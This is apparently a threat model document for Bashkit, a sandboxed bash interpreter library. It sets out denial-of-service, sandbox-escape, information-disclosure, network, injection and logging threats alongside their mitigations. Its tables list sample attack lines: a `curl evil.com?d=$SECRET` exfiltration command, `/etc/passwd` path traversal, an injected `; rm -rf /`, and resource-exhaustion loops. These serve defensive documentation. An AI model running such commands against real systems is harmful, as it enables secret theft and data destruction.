# Threat Model

Bashkit is designed to execute untrusted bash scripts safely in sandboxed environments.
This document describes the security threats we address and how they are mitigated.

**See also:**
- [API Documentation](https://docs.rs/bashkit) - Full API reference
- [Custom Builtins](./custom_builtins.md) - Extending Bashkit safely
- [Compatibility Reference](./compatibility.md) - Supported bash features
- [Logging Guide](./logging.md) - Structured logging with security (TM-LOG-*)

## Overview

Bashkit assumes all script input is potentially malicious. The sandbox prevents:

- **Resource exhaustion** (CPU, memory, disk)
- **Sandbox escape** (filesystem, process, privilege)
- **Information disclosure** (secrets, host info)
- **Network abuse** (exfiltration, unauthorized access)

## Threat Categories

### Denial of Service (TM-DOS-*)

Scripts may attempt to exhaust system resources. Bashkit mitigates these attacks
through configurable limits.

| Threat | Attack Example | Mitigation | Code Reference |
|--------|---------------|------------|----------------|
| Large input (TM-DOS-001) | 1GB script | `max_input_bytes` limit | [`limits.rs`][limits] |
| Infinite loops (TM-DOS-016) | `while true; do :; done` | `max_loop_iterations` | [`limits.rs`][limits] |
| Recursion (TM-DOS-020) | `f() { f; }; f` | `max_function_depth` | [`limits.rs`][limits] |
| Parser depth (TM-DOS-022) | `(((((...))))))` nesting | `max_ast_depth` + hard cap (100) | [`parser/mod.rs`][parser] |
| Command sub depth (TM-DOS-021) | `$($($($())))` nesting | Inherited depth/fuel from parent | [`parser/mod.rs`][parser] |
| Arithmetic depth (TM-DOS-026) | `$(((((...))))))` | `MAX_ARITHMETIC_DEPTH` (200) | [`interpreter/mod.rs`][interp] |
| Parser attack (TM-DOS-024) | Malformed input | `parser_timeout` | [`limits.rs`][limits] |
| Filesystem bomb (TM-DOS-007) | Zip bomb extraction | `FsLimits` | [`fs/limits.rs`][fslimits] |
| Many files (TM-DOS-006) | Create 1M files | `max_file_count` | [`fs/limits.rs`][fslimits] |
| Diff algorithm DoS (TM-DOS-028) | `diff` on large unrelated files | LCS matrix cap (10M cells) | [`builtins/diff.rs`][diff] |

**Configuration:**
```rust,ignore
use bashkit::{Bash, ExecutionLimits, FsLimits, InMemoryFs};
use std::sync::Arc;
use std::time::Duration;

let limits = ExecutionLimits::new()
    .max_commands(10_000)
    .max_loop_iterations(10_000)
    .max_function_depth(100)
    .timeout(Duration::from_secs(30))
    .max_input_bytes(10_000_000);  // 10MB

let fs_limits = FsLimits::new()
    .max_total_bytes(100_000_000)  // 100MB
    .max_file_size(10_000_000)     // 10MB per file
    .max_file_count(10_000);

let fs = Arc::new(InMemoryFs::with_limits(fs_limits));
let bash = Bash::builder()
    .limits(limits)
    .fs(fs)
    .build();
```

### Sandbox Escape (TM-ESC-*)

Scripts may attempt to break out of the sandbox to access the host system.

| Threat | Attack Example | Mitigation | Code Reference |
|--------|---------------|------------|----------------|
| Path traversal (TM-ESC-001) | `cat /../../../etc/passwd` | Path normalization | [`fs/memory.rs`][memory] |
| Symlink escape (TM-ESC-002) | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | [`fs/memory.rs`][memory] |
| Shell escape (TM-ESC-005) | `exec /bin/bash` | Not implemented | Returns exit 127 |
| External commands (TM-ESC-006) | `./malicious` | No external exec | Returns exit 127 |
| eval injection (TM-ESC-008) | `eval "$input"` | Sandboxed eval | Only runs builtins |

**Virtual Filesystem:**

Bashkit uses an in-memory virtual filesystem by default. Scripts cannot access the
real filesystem unless explicitly mounted via [`MountableFs`].

```rust,ignore
use bashkit::{Bash, InMemoryFs};
use std::sync::Arc;

// Default: fully isolated in-memory filesystem
let bash = Bash::new();

// Custom filesystem with explicit mounts (advanced)
use bashkit::MountableFs;
let fs = Arc::new(MountableFs::new());
// fs.mount_readonly("/data", "/real/path/to/data");  // Optional real FS access
```

### Information Disclosure (TM-INF-*)

Scripts may attempt to leak sensitive information.

| Threat | Attack Example | Mitigation | Code Reference |
|--------|---------------|------------|----------------|
| Env var leak (TM-INF-001) | `echo $SECRET` | Caller responsibility | See below |
| Host info (TM-INF-005) | `hostname` | Returns sandbox value | [`builtins/system.rs`][system] |
| Network exfil (TM-INF-010) | `curl evil.com?d=$SECRET` | Network allowlist | [`network/allowlist.rs`][allowlist] |

**Caller Responsibility (TM-INF-001):**

Do NOT pass sensitive environment variables to untrusted scripts:

```rust,ignore
// UNSAFE - secrets may be leaked
let bash = Bash::builder()
    .env("DATABASE_URL", "postgres://user:pass@host/db")
    .env("API_KEY", "sk-secret-key")
    .build();

// SAFE - only pass non-sensitive variables
let bash = Bash::builder()
    .env("HOME", "/home/user")
    .env("TERM", "xterm")
    .build();
```

**System Information:**

System builtins return configurable sandbox values, never real host information:

```rust,ignore
let bash = Bash::builder()
    .username("sandbox")         // whoami returns "sandbox"
    .hostname("bashkit-sandbox") // hostname returns "bashkit-sandbox"
    .build();
```

### Network Security (TM-NET-*)

Network access is disabled by default. When enabled, strict controls apply.

| Threat | Attack Example | Mitigation | Code Reference |
|--------|---------------|------------|----------------|
| Unauthorized access (TM-NET-004) | `curl http://internal:8080` | URL allowlist | [`network/allowlist.rs`][allowlist] |
| Large response (TM-NET-008) | 10GB download | Size limit (10MB) | [`network/client.rs`][client] |
| Redirect bypass (TM-NET-011) | Redirect to evil.com | No auto-redirect | [`network/client.rs`][client] |
| Compression bomb (TM-NET-013) | 10KB → 10GB gzip | No auto-decompress | [`network/client.rs`][client] |

**Network Allowlist:**

```rust,ignore
use bashkit::{Bash, NetworkAllowlist};

// Explicit allowlist - only these URLs can be accessed
let allowlist = NetworkAllowlist::new()
    .allow("https://api.example.com")
    .allow("https://cdn.example.com/assets/");

let bash = Bash::builder()
    .network(allowlist)
    .build();

// Scripts can now use curl/wget, but only to allowed URLs
// curl https://api.example.com/data  → allowed
// curl https://evil.com              → blocked (exit 7)
```

### Injection Attacks (TM-INJ-*)

| Threat | Attack Example | Mitigation |
|--------|---------------|------------|
| Command injection (TM-INJ-001) | `$input` containing `; rm -rf /` | Variables expand to strings only |
| Path injection (TM-INJ-005) | `../../../../etc/passwd` | Path normalization |
| Terminal escapes (TM-INJ-008) | ANSI sequences in output | Caller should sanitize |

**Variable Expansion:**

Variables expand to literal strings, not re-parsed as commands:

```bash
# If user_input contains "; rm -rf /"
user_input="; rm -rf /"
echo $user_input
# Output: "; rm -rf /" (literal string, NOT executed)
```

### Multi-Tenant Isolation (TM-ISO-*)

Each [`Bash`] instance is fully isolated. For multi-tenant environments, create
separate instances per tenant:

```rust,ignore
use bashkit::{Bash, InMemoryFs};
use std::sync::Arc;

// Each tenant gets completely isolated instance
let tenant_a = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Separate filesystem
    .build();

let tenant_b = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Different filesystem
    .build();

// tenant_a cannot access tenant_b's files or state
```

### Internal Error Handling (TM-INT-*)

Bashkit is designed to never crash, even when processing malicious or malformed input.
All unexpected errors are caught and converted to safe, human-readable messages.

| Threat | Attack Example | Mitigation | Code Reference |
|--------|---------------|------------|----------------|
| Builtin panic (TM-INT-001) | Trigger panic in builtin | `catch_unwind` wrapper | [`interpreter/mod.rs`][interp] |
| Info leak in panic (TM-INT-002) | Panic exposes secrets | Sanitized error messages | [`interpreter/mod.rs`][interp] |
| Date format crash (TM-INT-003) | Invalid strftime: `+%Q` | Pre-validation | [`builtins/date.rs`][date] |

**Panic Recovery:**

All builtins (both built-in and custom) are wrapped with panic catching:

```text
If a builtin panics, the script continues with a sanitized error.
The panic message is NOT exposed (may contain sensitive data).
Output: "bash: <command>: builtin failed unexpectedly"
```

**Error Message Safety:**

Error messages never expose:
- Stack traces or call stacks
- Memory addresses
- Real filesystem paths (only virtual paths)
- Panic messages that may contain secrets

### Logging Security (TM-LOG-*)

When the `logging` feature is enabled, Bashkit emits structured logs. Security features
prevent sensitive data leakage:

| Threat | Attack Example | Mitigation |
|--------|---------------|------------|
| Secrets in logs (TM-LOG-001) | Log `$PASSWORD` value | Env var redaction |
| Script leak (TM-LOG-002) | Log script with embedded secrets | Script content disabled by default |
| URL credentials (TM-LOG-003) | Log `https://user:pass@host` | URL credential redaction |
| API key leak (TM-LOG-004) | Log JWT or API key values | Entropy-based detection |
| Log injection (TM-LOG-005) | Script with `\n[ERROR]` | Newline escaping |

**Logging Configuration:**

```rust,ignore
use bashkit::{Bash, LogConfig};

// Default: secure (redaction enabled, script content hidden)
let bash = Bash::builder()
    .log_config(LogConfig::new())
    .build();

// Add custom redaction patterns
let bash = Bash::builder()
    .log_config(LogConfig::new()
        .redact_env("MY_CUSTOM_SECRET"))
    .build();
```

**Warning:** Do not use `LogConfig::unsafe_disable_redaction()` or
`LogConfig::unsafe_log_scripts()` in production.

## Parser Depth Protection

The parser includes multiple layers of depth protection to prevent stack overflow
attacks:

1. **Configurable depth limit** (`max_ast_depth`, default 100): Controls maximum nesting
   of compound commands (if/for/while/case/subshell).

2. **Hard cap** (`HARD_MAX_AST_DEPTH = 100`): Even if the caller configures a higher
   `max_ast_depth`, the parser clamps it to 100. This prevents misconfiguration from
   causing stack overflow.

3. **Child parser inheritance** (TM-DOS-021): When parsing `$(...)` or `<(...)`,
   the child parser inherits the *remaining* depth budget and fuel from the parent.
   This prevents attackers from bypassing depth limits through nested substitutions.

4. **Arithmetic depth limit** (TM-DOS-026): The arithmetic evaluator (`$((expr))`)
   has its own depth limit (`MAX_ARITHMETIC_DEPTH = 200`) to prevent stack overflow
   from deeply nested parenthesized expressions.

5. **Parser fuel** (`max_parser_operations`, default 100K): Independent of depth,
   limits total parser work to prevent CPU exhaustion.

## Python Subprocess Isolation (TM-PY-022 to TM-PY-026)

> **Experimental.** The Monty Python integration is experimental. Monty is an
> early-stage interpreter with known crash-level bugs (e.g., parser segfaults).
> Subprocess isolation mitigates host crashes, but undiscovered vulnerabilities
> may exist. Treat the Python feature as less mature than the rest of BashKit's
> security boundary.

When using `PythonIsolation::Subprocess`, the Monty interpreter runs in a separate
child process (`bashkit-monty-worker`). This provides crash isolation — if the
interpreter segfaults, only the worker process dies. The host continues running
normally.

| Threat | Mitigation |
|--------|------------|
| Parser segfault kills host (TM-PY-022) | Worker runs in child process |
| Worker binary spoofing (TM-PY-023) | Caller responsibility — secure env/PATH |
| Worker hang blocks parent (TM-PY-024) | IPC timeout (max_duration + 5s) |
| Worker leaks host env vars (TM-PY-025) | `env_clear()` on worker process |
| Worker sends oversized response (TM-PY-026) | IPC line size capped at 16 MB |

**Caller Responsibility (TM-PY-023):** The `BASHKIT_MONTY_WORKER` environment variable
controls which binary is spawned as the worker process. Do not let untrusted input
control this variable or the system PATH.

## Security Testing

Bashkit includes comprehensive security tests:

- **Threat Model Tests**: [`tests/threat_model_tests.rs`][threat_tests] - 117 tests
- **Nesting Depth Tests**: 18 tests covering positive, negative, misconfiguration,
  and regression scenarios for parser depth attacks
- **Fail-Point Tests**: [`tests/security_failpoint_tests.rs`][failpoint_tests] - 14 tests
- **Network Security**: [`tests/network_security_tests.rs`][network_tests] - 53 tests
- **Builtin Error Security**: `tests/builtin_error_security_tests.rs` - 39 tests
- **Logging Security**: `tests/logging_security_tests.rs` - 26 tests
- **Fuzz Testing**: [`fuzz/`][fuzz] - Parser and lexer fuzzing

## Reporting Security Issues

If you discover a security vulnerability, please report it privately via
GitHub Security Advisories rather than opening a public issue.

## Threat ID Reference

All threats use stable IDs in the format `TM-<CATEGORY>-<NUMBER>`:

| Prefix | Category |
|--------|----------|
| TM-DOS | Denial of Service |
| TM-ESC | Sandbox Escape |
| TM-INF | Information Disclosure |
| TM-INJ | Injection |
| TM-NET | Network Security |
| TM-ISO | Multi-Tenant Isolation |
| TM-INT | Internal Error Handling |
| TM-LOG | Logging Security |
| TM-PY | Python/Monty Security |

Full threat analysis: [`specs/006-threat-model.md`][spec]

[limits]: https://docs.rs/bashkit/latest/bashkit/struct.ExecutionLimits.html
[fslimits]: https://docs.rs/bashkit/latest/bashkit/struct.FsLimits.html
[memory]: https://docs.rs/bashkit/latest/bashkit/struct.InMemoryFs.html
[system]: https://docs.rs/bashkit/latest/bashkit/struct.BashBuilder.html#method.username
[allowlist]: https://docs.rs/bashkit/latest/bashkit/struct.NetworkAllowlist.html
[client]: https://docs.rs/bashkit/latest/bashkit/struct.HttpClient.html
[threat_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/threat_model_tests.rs
[failpoint_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/security_failpoint_tests.rs
[network_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/network_security_tests.rs
[fuzz]: https://github.com/everruns/bashkit/tree/main/crates/bashkit/fuzz
[spec]: https://github.com/everruns/bashkit/blob/main/specs/006-threat-model.md
[parser]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/parser/mod.rs
[interp]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/interpreter/mod.rs
[date]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/builtins/date.rs
[diff]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/builtins/diff.rs
